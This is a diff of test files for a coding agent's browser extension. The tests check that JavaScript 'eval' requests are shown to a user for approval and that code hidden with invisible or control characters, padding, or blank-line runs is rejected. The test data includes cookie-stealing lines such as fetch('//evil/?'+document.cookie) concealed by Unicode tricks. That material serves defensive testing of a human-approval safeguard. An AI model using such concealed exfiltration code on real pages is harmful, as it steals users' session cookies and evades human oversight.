@@ -4,9 +4,9 @@ import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import test from "node:test";
 import type { ExtensionAPI, ExtensionContext } from "@earendil-works/pi-coding-agent";
-import { Approvals, type Choice } from "../src/approval.ts";
+import { Approvals, confirmEval, type Choice } from "../src/approval.ts";
 import { loadHosts } from "../src/config.ts";
-import { browserExtension, listTabs } from "../src/index.ts";
+import { browserExtension, listTabs, truncate } from "../src/index.ts";
 
 const dir = await mkdtemp(join(tmpdir(), "pi-browser-approval-"));
 test.after(() => rm(dir, { recursive: true, force: true }));
@@ -104,6 +104,45 @@ test("the config can be hand-edited and is checked on every action", async () =>
   await assert.rejects(loadHosts(path), /not valid JSON/);
   await writeFile(path, JSON.stringify({ allowedHosts: "example.com" }));
   await assert.rejects(loadHosts(path), /array of hostnames/);
+});
+
+test("eval shows its code, host, and line count and runs only when the run option is chosen", async () => {
+  const shown: [string, string[]][] = [];
+  const answers = ["Run all 1 line", "Don't run", undefined, "Run all 2 lines"];
+  const choose = async (title: string, options: string[]) => { shown.push([title, options]); return answers.shift(); };
+  await confirmEval("document.title", "example.com", choose);
+  await assert.rejects(confirmEval("document.cookie", "example.com", choose), /did not allow this eval/);
+  await assert.rejects(confirmEval("document.cookie", "example.com", choose), /did not allow this eval/);
+  await confirmEval("const a = 1;\n\ta;", "example.com", choose);
+  await assert.rejects(confirmEval("  ", "example.com", choose), /eval needs code/);
+  assert.deepEqual(shown, [
+    ["Run this JavaScript in the example.com tab?\ndocument.title", ["Run all 1 line", "Don't run"]],
+    ["Run this JavaScript in the example.com tab?\ndocument.cookie", ["Run all 1 line", "Don't run"]],
+    ["Run this JavaScript in the example.com tab?\ndocument.cookie", ["Run all 1 line", "Don't run"]],
+    ["Run this JavaScript in the example.com tab?\nconst a = 1;\n\ta;", ["Run all 2 lines", "Don't run"]],
+  ]);
+});
+
+test("eval refuses code that could hide part of itself from the prompt", async () => {
+  const choose = async () => { throw new Error("should not ask"); };
+  for (const code of ["document.title\u001b[8m;fetch('//evil/?'+document.cookie)\u001b[0m", "fetch('//evil')\rdocument.title", "a\u0085b", "x\u202e)(lave",
+    "// cleanup\u2028fetch('//evil?'+document.cookie)", "// cleanup\u2029fetch('//evil')", "a\u061cb", "a\u200bb", "a\u200db", "a\u2060b", "\ufeffdocument.title",
+    "const a\ufe00 = 'evil'; const a = 'ok'; a\ufe00", "const \u3164 = 1", "a\uffa0b", "a\u115fb", "a\u00adb", "a\u034fb", "a\u180eb", "a\u{e0041}b"]) {
+    await assert.rejects(confirmEval(code, "example.com", choose), /invisible or control characters/);
+  }
+  await assert.rejects(confirmEval(`fetch('//evil')${"\na;".repeat(20)}`, "example.com", choose), /limited to 20 lines/);
+  await assert.rejects(confirmEval(`document.title;${" ".repeat(2_000)}fetch('//evil')`, "example.com", choose), /1500 characters/);
+  for (const code of ["fetch('//evil')\n\n\ndocument.title", "fetch('//evil')\n \n\t\ndocument.title", "\n\ndocument.title", "a\n\u00a0\n\n"]) {
+    await assert.rejects(confirmEval(code, "example.com", choose), /two blank lines in a row/);
+  }
+});
+
+test("output whose first line alone is over the byte limit keeps the start of that line", () => {
+  const text = truncate(`"${"x".repeat(80 * 1024)}"\nmore`);
+  assert.ok(text.startsWith(`"${"x".repeat(1000)}`));
+  assert.match(text, /\n\n\[Output truncated: showing the first 50\.0KB of line 1 \(80\.0KB\) of 2 lines\.\]$/);
+  assert.ok(Buffer.byteLength(text) < 51 * 1024);
+  assert.equal(truncate("short"), "short");
 });
 
 test("tabs shows a tab that has not loaded yet as loading, only the host of unapproved tabs, and only the scheme of non-web tabs", async () => {
